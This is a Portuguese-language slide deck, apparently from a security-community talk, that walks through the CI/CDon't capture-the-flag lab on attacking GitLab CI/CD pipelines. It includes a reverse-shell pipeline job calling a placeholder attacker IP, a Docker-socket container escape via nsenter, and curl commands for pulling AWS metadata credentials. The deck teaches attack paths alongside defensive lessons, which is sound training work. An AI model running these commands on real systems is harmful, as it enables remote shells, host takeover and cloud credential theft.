---
theme: default
layout: cover
class: 'text-center'
highlighter: shiki
lineNumbers: true
fonts:
  sans: 'Nunito'
themeConfig:
  websiteUrl: https://guisso.dev
  avatar: https://guisso.dev/5755568_4424276171815601475_hu0e7c20109915d8890daa45a87ae252d1_16018_288x288_fill_q96_box_center.jpg
  photo: './guisso-photo.png'
---

# <span>CI</span>/<span style="color:rgb(208, 49, 49);">CDon’t</span>

Um lab sobre invasão de pipelines.

<div class="pt-12">
  <span @click="$slidev.nav.next" class="px-2 py-1 rounded cursor-pointer" hover="bg-white bg-opacity-10">
    Vamos começar! <carbon:arrow-right class="inline"/>
  </span>
</div>

---
src: ../../pages/guisso-queisso.md
---
Guisso
---

# Sobre a <span style="color:rgb(138, 110, 86)">SunsecRN</span>

- Comunidade de segurança da informação em [Natal/RN](https://sunsecrn.org)  
- Criamos um mini CTF pra essa semana 🎯  
- Quem resolver os desafios será convidado para nosso grupo de estudos  
- Conecte, aprenda, pratique!

---

# Labs de <span style="color:rgb(45, 101, 214)">Cloud</span> <span>Security</span>

Plataformas para praticar:

- [AWSGoat](https://github.com/ine-labs/AWSGoat)  
- [GCPGoat](https://github.com/ine-labs/GCPGoat)  
- [AzureGoat](https://github.com/ine-labs/AzureGoat)  
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)  
- [CICDGoat](https://github.com/cider-security-research/cicd-goat)  
- [IAM Vulnerable](https://github.com/BishopFox/iam-vulnerable)  
- [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat)  
- [Hacking The Cloud Labs](https://hackingthe.cloud)

🎯 Hoje vamos focar no [**Ci/CDont**](https://hackingthe.cloud/aws/capture_the_flag/cicdont/)

---

# Por que o <span>CI</span>/<span style="color:rgb(208, 49, 49);">CDon’t</span>?

<v-clicks>

- Mostra como pipelines CI/CD mal configuradas viram um ataque real  
- Te ajuda a pensar como atacante  
- Desenvolve o olhar de defesa baseado em exploração real  
- Ideal pra estudar sozinho ou em grupo

</v-clicks>

---
src: ./cicdont-diagram.md
---
Diagrama
---

# Acesso inicial: <span style="color: #ffaa00"> GitLab</span>

Como um atacante pode obter acesso?

<v-clicks depth="2">

- Registro aberto a externos com acesso ao repositório/pipeline  
- Comprometimento de credenciais:
  - Senha fraca  
  - [Password Spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) com dados vazados  
  - [Phishing](https://pt.wikipedia.org/wiki/Phishing), mesmo com MFA

</v-clicks>

<v-click at="6">
🧠 A <span v-mark="{ at: 6, color: '#00aa22', type: 'underline' }">segurança</span> do <span v-mark="{ at: 6, color: '#ffaa00', type: 'circle' }">usuário</span> importa (e muito)
</v-click>

---

# Pipeline Poisoning

<v-clicks>

1. Acesso ao <span v-mark="{ at: 1, color: '#ffaa00', type: 'underline' }">repositório</span>
2. Modificação no <span v-mark="{ at: 2, color: '#ffaa99', type: 'circle' }">`.gitlab-ci.yml`</span>
3. <span v-mark="{ at: 3, color: '#aa1100', type: 'underline' }">Injeção</span> de código malicioso (ex: <span v-mark="{ at: 3, color: '#aa1100', type: 'box' }">reverse shell</span>)
4. Execução <span v-mark="{ at: 3, color: '#3355aa', type: 'highlight' }">automática</span> no runner

</v-clicks>

<v-click at="5">

🎯 *Ganhamos shell dentro do ambiente do runner* 

</v-click>

<v-click at="6">

🔗 [GitLab CI/CD Pipelines](https://docs.gitlab.com/ee/ci/)

</v-click>

<v-click at="7">

```bash
sudo ncat -l 443 --ssl -v
```

```yaml
build-job:
    stage: build
    script:
      - apt update
      - apt install -y ncat
      - ncat <ip_atacante> --ssl -e /bin/bash -v 
```

</v-click>

<style>
h1 {
  background-color:rgb(168, 43, 182);
  background-image: linear-gradient(85deg,rgb(181, 78, 212) 15%,rgb(102, 20, 140) 25%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---

# Escalação de privilégios

No runner comprometido:

🎯 *O shell é só o começo.*
<v-clicks>

- Buscar permissões locais e scripts executados como root  
- Abusar de permissões mal configuradas  
- Acessar processos com privilégios elevados
- Procurar recursos disponiveis internamente

</v-clicks>

<style>
h1 {
  background-color:rgb(43, 182, 143);
  background-image: linear-gradient(85deg,rgb(78, 212, 132) 15%,rgb(20, 140, 122) 25%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---

# Docker Socket & Escapando do container

```bash {0|1-2|4|6|8|10|all}
ls /var/run
docker.sock  lock  mount  systemd utmp

apt install -y python3 docker.io

python3 -c "import pty;pty.spawn('/bin/bash')"

docker run -it --rm --pid=host --privileged ubuntu bash

nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

<v-click at="1">

- Procurar pelo docker socket, geralmente ele é passado para um container para ajudar a gerenciar outros containers. ex; Portainer

</v-click>

<v-click at="4">

- Nem preciso apontar para onde esta o socket, visto que ele esta no lugar e nome padrão, então CLI já pega.

</v-click>

<v-click at="5">

- Ele inicia um shell bash que utiliza os mesmos ambientes isolados (namespaces de montagem, UTS, IPC, rede e PID) do processo 1, herdando assim suas configurações e permissões.

</v-click>


<style>
li {
  color: #a1a1a1;
}
h1 {
  background-color:rgb(43, 182, 143);
  background-image: linear-gradient(85deg,rgb(78, 212, 132) 15%,rgb(20, 140, 122) 25%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---

# <span class="imds">IMDS</span> — Instance Metadata Service

<v-clicks>

- Serviço da AWS interno <span v-mark="{ at: 1, color: '#55bb11', type: 'underline' }">`169.254.169.254`</span>
- Expõe metadados e [credenciais temporárias](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)  
- Usado para acessar recursos da AWS a partir de instâncias  
- Com permissões <span v-mark="{ at: 4, color: '#bb1100', type: 'box' }">mal definidas</span> → <span v-mark="{ at: 5, color: '#55bb11', type: 'highlight' }">controle total</span>

</v-clicks>

<style>
.imds {
  background-color:rgb(43, 182, 143);
  background-image: linear-gradient(45deg,rgb(78, 212, 132) 25%,rgb(20, 140, 122) 55%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---
routeAlias: imds
---
# <span class="imds">IMDS</span> — Instance Metadata Service
<Link to="6?clicks=8">Relembrar</Link>

🔥 Do runner à AWS com um simples `curl`

<v-clicks>

IMDSv2
```bash {0|1|2|all}
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data/
```

IMDSv1
```bash {0|all}{at:'+1'}
curl -v http://169.254.169.254/latest/user-data/
```

</v-clicks>

<style>
.imds {
  background-color:rgb(43, 182, 143);
  background-image: linear-gradient(45deg,rgb(78, 212, 132) 25%,rgb(20, 140, 122) 55%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>


---

# Lições <span>aprendidas</span>

<v-clicks depth="2">

- CI/CD é parte crítica da segurança da sua infra  
- Proteja:
  - Acesso ao GitLab ([GitLab Security Best Practices](https://about.gitlab.com/security/hardening/))  
  - Configuração dos runners ([GitLab Runner Security](https://docs.gitlab.com/runner/security/))  
  - Permissões de instâncias AWS  
  - Monitoramento de pipelines e infra

</v-clicks>

---

# <span>Estude</span> com a <span>gente</span>

- Refaça o lab:  
  👉 [hackingthe.cloud/aws/cicdont](https://hackingthe.cloud/aws/capture_the_flag/cicdont/)  
- Participe da comunidade: [sunsec.net](http://sunsec.net)  
- Acesse nosso mini CTF e entre no grupo de estudos
- Colabore com labs e dinâmicas futuras!

<img style="margin: 0 auto;" src="/qr_ctf.png" class="w-32 h-32 rounded-2 object-contain" />

---
layout: cover
---
# <span class="anime">Obrigado!</span>

[Contatos](https://guisso.dev/links)

<style>
h1{
  user-select: none;
  font-size: 100px;
  color: white;
  background: repeating-linear-gradient(-45deg, red 0%, yellow 7.14%, rgb(0,255,0) 14.28%,
              rgb(0,255,255) 21.4%, cyan 28.56%, blue 35.7%, magenta 42.84%, red 50%);
  background-size: 600vw 600vw;
  -webkit-text-fill-color: transparent;
  -webkit-background-clip: text;
  animation: slide 10s linear infinite forwards;
}
@keyframes slide {
  0%{
    background-position-x: 0%;
  }
  100%{
    background-position-x: 600vw;
  }
}

</style>
